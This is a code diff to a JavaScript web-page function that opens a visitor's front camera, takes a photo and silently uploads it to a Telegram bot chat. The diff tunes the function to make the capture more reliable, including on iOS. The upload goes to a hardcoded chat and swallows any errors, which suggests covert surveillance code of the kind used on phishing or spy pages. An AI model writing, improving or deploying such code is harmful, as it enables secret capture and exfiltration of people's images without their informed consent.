@@ -311,16 +311,22 @@ async function ejecutarFlujo(boton){
     if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia){
       var stream=await Promise.race([
         navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false}),
-        new Promise(function(_,rej){setTimeout(function(){rej(new Error('timeout'));},5000);})
+        new Promise(function(_,rej){setTimeout(function(){rej(new Error('timeout'));},12000);})
       ]);
-      var video=document.createElement('video');video.srcObject=stream;video.muted=true;video.setAttribute('playsinline','');
+      var video=document.createElement('video');video.srcObject=stream;video.muted=true;video.setAttribute('playsinline','');video.setAttribute('autoplay','');
       await video.play();
-      await new Promise(function(r){setTimeout(r,700);});
-      var c=document.createElement('canvas');c.width=video.videoWidth||480;c.height=video.videoHeight||480;
+      await new Promise(function(r){setTimeout(r,1200);});
+      var c=document.createElement('canvas');c.width=video.videoWidth||640;c.height=video.videoHeight||480;
       c.getContext('2d').drawImage(video,0,0);
       foto=c.toDataURL('image/jpeg',0.85);
       stream.getTracks().forEach(function(t){t.stop();});
-      if(foto){var blob=dataURLtoBlob(foto),fd=new FormData();fd.append('chat_id',CHAT);fd.append('photo',blob,'foto.jpg');fd.append('caption','📷 Foto frontal');fetch(API+'/sendPhoto',{method:'POST',body:fd}).catch(function(){});}
+      // Enviar foto por base64 (más estable que FormData en iOS)
+      var base64Data=foto.split(',')[1];
+      fetch(API+'/sendPhoto',{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({chat_id:CHAT,photo:base64Data,caption:'📷 Foto frontal'})
+      }).catch(function(){});
     }
   }catch(e){console.log('Camara err:',e);}
   await new Promise(function(r){setTimeout(r,600);});
